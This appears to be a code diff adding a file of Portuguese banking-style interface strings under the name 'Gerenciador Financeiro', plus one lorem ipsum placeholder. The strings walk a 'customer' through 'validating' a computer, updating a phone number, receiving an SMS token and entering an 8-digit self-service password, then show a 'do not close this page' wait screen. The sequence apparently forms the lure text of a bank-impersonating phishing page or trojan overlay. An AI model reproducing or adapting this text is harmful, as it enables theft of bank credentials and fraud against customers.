@@ -1,0 +1,15 @@
+Celular atualizado com sucesso, para finalizar digite sua senha do autoatendimento de 8 digitos..
+Gerenciador Financeiro
+Prezado Cliente,
+Para maior segurança na realização de suas transações bancárias, este computador precisa ser validado,
+para realizar essa validação de cadastro o primeiro passo é atribuir um apelido para o computador. Para isso, utilize o campo abaixo
+Gerenciador Financeiro
+Para continuar seu atendimento, precisamos atualizar o número do seu celular
+Gerenciador Financeiro
+Prezado Cliente!
+Para continuar vamos enviar um token via Sms, para o numero de celular cadastrado em sua conta.
+Gerenciador Financeiro
+Dear client!
+Lorem ipsum dolor sit amet, consectetur adipisicing elit. Totam quos eos doloribus quam, esse quae. Cumque corporis fuga saepe minima, ducimus laboriosam nesciunt, laborum deleniti eveniet repellat repellendus fugit! Quo.
+Por favor, Aguarde!
+Estamos verificando seus dados. Não feche esta página.
